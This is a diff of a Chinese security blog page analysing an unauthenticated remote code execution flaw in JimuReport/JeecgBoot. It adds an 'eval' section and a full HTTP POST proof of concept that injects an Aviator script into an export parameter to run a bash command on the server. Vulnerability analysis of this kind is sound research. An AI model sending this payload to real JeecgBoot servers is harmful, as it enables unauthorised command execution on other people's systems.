@@ -11,7 +11,7 @@
   <meta itemprop="description" content="影响版本 JeecgBoot &lt;=v3.9.3(JimuReport &lt;=2.5.0)">
   <meta itemprop="datePublished" content="2026-09-05T11:23:34+08:00">
   <meta itemprop="dateModified" content="2026-09-05T11:23:34+08:00">
-  <meta itemprop="wordCount" content="815">
+  <meta itemprop="wordCount" content="871">
   <meta itemprop="keywords" content="JimuReport RCE"><meta property="og:url" content="https://blog.p0l1st.top/post/jimureport-autoexport-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E5%88%86%E6%9E%90/">
   <meta property="og:site_name" content="p0l1st&#39;s blog">
   <meta property="og:title" content="JimuReport Autoexport 未授权RCE分析">
@@ -38,7 +38,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/blog.p0l1st.top\/post\/jimureport-autoexport-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E5%88%86%E6%9E%90\/"
-    },"genre": "posts","keywords": "JimuReport RCE","wordcount":  815 ,
+    },"genre": "posts","keywords": "JimuReport RCE","wordcount":  871 ,
     "url": "https:\/\/blog.p0l1st.top\/post\/jimureport-autoexport-%E6%9C%AA%E6%8E%88%E6%9D%83rce%E5%88%86%E6%9E%90\/","datePublished": "2026-09-05T11:23:34+08:00","dateModified": "2026-09-05T11:23:34+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -80,7 +80,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>JimuReport Autoexport 未授权RCE分析</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img class="avatar" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603311542974.png' alt="p0l1st" height="16" width="16">&nbsp;p0l1st</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/jimureport/" class="post-category" title="Category - JimuReport"><i class="fa-regular fa-folder" aria-hidden="true"></i> JimuReport</a></span></div><div class="post-meta-line"><span title="published on 2026-09-05 11:23:34"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2026-09-05">2026-09-05</time></span>&nbsp;<span title="815 words"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>About 900 words</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img class="avatar" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603311542974.png' alt="p0l1st" height="16" width="16">&nbsp;p0l1st</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/jimureport/" class="post-category" title="Category - JimuReport"><i class="fa-regular fa-folder" aria-hidden="true"></i> JimuReport</a></span></div><div class="post-meta-line"><span title="published on 2026-09-05 11:23:34"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2026-09-05">2026-09-05</time></span>&nbsp;<span title="871 words"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>About 900 words</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -91,7 +91,12 @@
     <li><a href="#影响版本">影响版本</a></li>
     <li><a href="#环境搭建">环境搭建</a></li>
     <li><a href="#漏洞分析">漏洞分析</a></li>
-    <li><a href="#poc">PoC</a></li>
+    <li><a href="#poc">PoC</a>
+      <ul>
+        <li><a href="#groovy">Groovy</a></li>
+        <li><a href="#eval">eval</a></li>
+      </ul>
+    </li>
   </ul>
 </nav></div>
       </div><div class="content" id="content"><h1 class="heading-element" id="影响版本"><span>影响版本</span>
@@ -341,7 +346,11 @@
   <a href="#poc" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h1><pre tabindex="0"><code>GET /jeecg-boot/jmreport/excelQueryByTemplate?name=&amp;pageNo=1&amp;pageSize=10 HTTP/1.1
+</h1><h2 class="heading-element" id="groovy"><span>Groovy</span>
+  <a href="#groovy" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><pre tabindex="0"><code>GET /jeecg-boot/jmreport/excelQueryByTemplate?name=&amp;pageNo=1&amp;pageSize=10 HTTP/1.1
 Host: 127.0.0.1:8080
 Content-Type: application/json
 Accept: application/json</code></pre><pre tabindex="0"><code>POST /jeecg-boot/jmreport/auto/export HTTP/1.1
@@ -359,7 +368,40 @@ Accept: application/json
   }]
 }</code></pre><p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image-20260904230442654.png' alt="image-20260904230442654"></p>
 <p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image-20260904230519166.png' alt="image-20260904230519166"></p>
-</div><div class="post-footer" id="post-footer">
+<h2 class="heading-element" id="eval"><span>eval</span>
+  <a href="#eval" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Aviator文档中存在一个内置函数<code>eval</code></p>
+<p><a href="https://www.yuque.com/boyan-avfmj/aviatorscript/ashevw" target="_blank" rel="external nofollow noopener noreferrer">https://www.yuque.com/boyan-avfmj/aviatorscript/ashevw</a></p>
+<p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image-20260905180112089.png' alt="image-20260905180112089"></p>
+<p>等价于<code>AviatorEvaluator.execute(script, env, cached)</code>，那么就有</p>
+<pre tabindex="0"><code>aviator.execute(Script)
+=
+aviator.execute(eval(script))
+=
+aviator.execute(aviator.execute(Script))</code></pre><p>脚本中可以执行<code>execute</code>自然也可以直接进行<code>setFunctionMissing</code>允许调用非静态方法</p>
+<p>并且<code>setFunctionMissing</code>本身就是静态方法</p>
+<p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image-20260905181053963.png' alt="image-20260905181053963"></p>
+<p>因此可以构造payload</p>
+<pre tabindex="0"><code>use com.googlecode.aviator.AviatorEvaluator;
+use com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing;
+AviatorEvaluator.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance());
+AviatorEvaluator.execute(&#39;use java.lang.Runtime; exec(Runtime.getRuntime(), &#34;&#34;)&#39;)</code></pre><p>最终PoC</p>
+<pre tabindex="0"><code>POST /jeecg-boot/jmreport/auto/export HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/json
+Accept: application/json
+
+{
+  &#34;reportParams&#34;: [{
+    &#34;id&#34;: &#34;907480464532770816&#34;,
+    &#34;exportType&#34;: &#34;pdf&#34;,
+    &#34;params&#34;: {
+        &#34;x&#34;: &#34;=use com.googlecode.aviator.AviatorEvaluator; use com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing; AviatorEvaluator.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance()); AviatorEvaluator.execute(&#39;use java.lang.Runtime; exec(Runtime.getRuntime(), string.split(\&#34;/bin/bash,-c,touch /tmp/pwned3\&#34;, \&#34;,\&#34;))&#39;)&#34;
+      }
+  }]
+}</code></pre></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod"><span title="Updated on 2026-09-05 11:23:34">Updated on 2026-09-05&nbsp;</span>
@@ -392,7 +434,12 @@ Accept: application/json
     <li><a href="#影响版本">影响版本</a></li>
     <li><a href="#环境搭建">环境搭建</a></li>
     <li><a href="#漏洞分析">漏洞分析</a></li>
-    <li><a href="#poc">PoC</a></li>
+    <li><a href="#poc">PoC</a>
+      <ul>
+        <li><a href="#groovy">Groovy</a></li>
+        <li><a href="#eval">eval</a></li>
+      </ul>
+    </li>
   </ul>
 </nav></div>
       </div>
